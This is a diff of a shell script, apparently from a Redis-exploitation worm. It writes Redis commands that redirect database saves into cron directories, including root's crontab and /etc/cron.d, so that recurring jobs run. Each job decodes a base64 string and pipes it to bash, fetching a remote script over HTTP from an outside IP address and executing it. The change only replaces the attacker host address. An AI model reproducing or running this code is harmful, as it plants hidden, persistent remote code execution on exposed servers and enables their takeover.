@@ -12,18 +12,18 @@ echo 'config set dbfilename "backup.db"' > .dat
 echo 'save' >> .dat
 echo 'config set stop-writes-on-bgsave-error no' >> .dat
 echo 'flushall' >> .dat
-echo 'set backup1 "\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly85My45NS4yMjkuMjAzL2Iuc2gK|base64 -d|bash|bash \n\n"' >> .dat
-echo 'set backup2 "\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovLzkzLjk1LjIyOS4yMDMvYi5zaAo=|base64 -d|bash|bash\n\n"' >> .dat
-echo 'set backup3 "\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vOTMuOTUuMjI5LjIwMy9iLnNoCg==|base64 -d|bash|bash\n\n"' >> .dat
+echo 'set backup1 "\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly80NS4xNDUuNy4yNTMvYi5zaAo=|base64 -d|bash|bash \n\n"' >> .dat
+echo 'set backup2 "\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovLzQ1LjE0NS43LjI1My9iLnNoCg==|base64 -d|bash|bash\n\n"' >> .dat
+echo 'set backup3 "\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vNDUuMTQ1LjcuMjUzL2Iuc2gK|base64 -d|bash|bash\n\n"' >> .dat
 echo 'config set dir "/var/spool/cron/"' >> .dat
 echo 'config set dbfilename "root"' >> .dat
 echo 'save' >> .dat
 echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
 echo 'save' >> .dat
 echo 'flushall' >> .dat
-echo 'set backup1 "\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly85My45NS4yMjkuMjAzL2Iuc2gK|base64 -d|bash|bash \n\n"' >> .dat
-echo 'set backup2 "\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovLzkzLjk1LjIyOS4yMDMvYi5zaAo=|base64 -d|bash|bash\n\n"' >> .dat
-echo 'set backup3 "\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vOTMuOTUuMjI5LjIwMy9iLnNoCg==|base64 -d|bash|bash\n\n"' >> .dat
+echo 'set backup1 "\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly80NS4xNDUuNy4yNTMvYi5zaAo=|base64 -d|bash|bash \n\n"' >> .dat
+echo 'set backup2 "\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovLzQ1LjE0NS43LjI1My9iLnNoCg==|base64 -d|bash|bash\n\n"' >> .dat
+echo 'set backup3 "\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vNDUuMTQ1LjcuMjUzL2Iuc2gK|base64 -d|bash|bash\n\n"' >> .dat
 echo 'config set dir "/etc/cron.d/"' >> .dat
 echo 'config set dbfilename "zzh"' >> .dat
 echo 'save' >> .dat
